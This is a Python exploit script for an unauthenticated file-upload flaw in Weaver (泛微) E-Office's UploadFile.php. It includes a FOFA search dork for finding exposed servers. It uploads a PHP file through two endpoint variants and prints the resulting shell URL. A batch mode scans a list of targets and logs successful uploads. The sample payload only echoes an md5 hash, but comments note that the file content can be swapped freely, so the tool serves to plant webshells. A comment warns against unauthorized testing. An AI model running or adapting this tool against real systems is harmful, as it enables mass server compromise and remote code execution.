import requests
import sys
import re
'''
fofa:app="泛微-EOffice"
请熟读网络安全法，禁止做非授权渗透测试

本工具共尝试2种上传路径，均失败后显示上传失败

md5('1232123213') == 8942939b31e8dd5d331784f609e7098a 
'''
def theme_upload(url):
    uri2 = '/general/index/UploadFile.php?m=uploadPicture&uploadType=theme&userId=1'
    url_theme = url + uri2
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763',
    }
    text1 = '''<?php echo md5('1232123213');?>
    '''                     #文件内容可自行更改
    file={'Filedata':('test.php',text1)}

    resp = requests.post(url=url_theme, headers=header, files=file,timeout=5)
    #resp_text = re.findall(r"{\"name\":\"(.+?php)",resp.text)
    resp_text = resp.text
    resp1_text = re.findall(r"{\"name\":\"(.+?php)",resp_text)
    #print(resp_text)
    resp_code = resp.status_code
    shell_url = url + '/images/themes/' + str(resp1_text[0])
    if resp_code == 200 and '{\"name\":' in resp_text:
        print(f'[+]theme上传成功:{shell_url}')
    else:
        print('[-]theme上传失败，无法利用')


def upload(url):
    uri = '/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId='
    url_all = url + uri
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763',
    }
    text1 = '''<?php echo md5('1232123213');?>
    '''                     #文件内容可自行更改
    file={'Filedata':('test.php',text1)}
    try:
        resp=requests.post(url=url_all,headers=header,files=file)
        resp_text=resp.text
        resp_code=resp.status_code
        shell_url=url+'/images/logo/'+resp_text
        if resp_code ==200 and 'logo-eoffice.php' in resp_text:
            print(f'[+]eoffice_logo上传成功:{shell_url}')
        else:
            print('[-]eoffice_logo上传失败，尝试新路径上传')
            url1 = url
            theme_upload(url1)
    except:
        print('[-]请求错误')

def upload_pl(files):
    uri = '/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId='
    f = open(files)
    f1 = f.readlines()
    for url in f1:
        url =url.replace('\n','')
        url_all = url + uri
        #print("测试路径"+url_all)
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763',
        }
        text1 = '''<?php echo md5('1232123213');?>
            '''  # 文件内容可自行更改
        file = {'Filedata': ('test.php', text1)}
        try:
            resp = requests.post(url=url_all, headers=header, files=file,timeout=5)
            resp_text = resp.text
            resp_code = resp.status_code
            shell_url = url + '/images/logo/' + resp_text
            if resp_code == 200 and 'logo-eoffice.php' in resp_text:
                print(f'[+]eoffice_logo上传成功:{shell_url}')
                f_success = open('success.txt','a+')
                f_success.write(shell_url + '\n')
                f_success.close()
                continue
            else:
                print('[-]eoffice_logo上传失败，尝试新路径上传')
                url1 = url
                theme_upload(url1)
        except:
            print('[-]请求错误')

def help():
    print(' ')
    print('[+] python3 eoffice_fileupload -h  查看帮助 ')
    print('[+] python3 eoffice_fileupload -upload http://127.0.0.1:8020  验证单个URL ')
    print('[+] python3 eoffice_fileupload --upload-pl url.txt  批量验证URL ')

if __name__=="__main__":
    try:
        print('')
        cmd1 = sys.argv[1]

        if cmd1 == '-h':
            help()
        elif cmd1 == '-upload':
            cmd2 = sys.argv[2]
            upload(cmd2)
        elif cmd1 == '--upload-pl':
            cmd2 = sys.argv[2]
            upload_pl(cmd2)
        else:
            print('[-]请输入正确的参数，或者-h查看帮助')
    except:
        print('[-]请输入-h查看帮助')
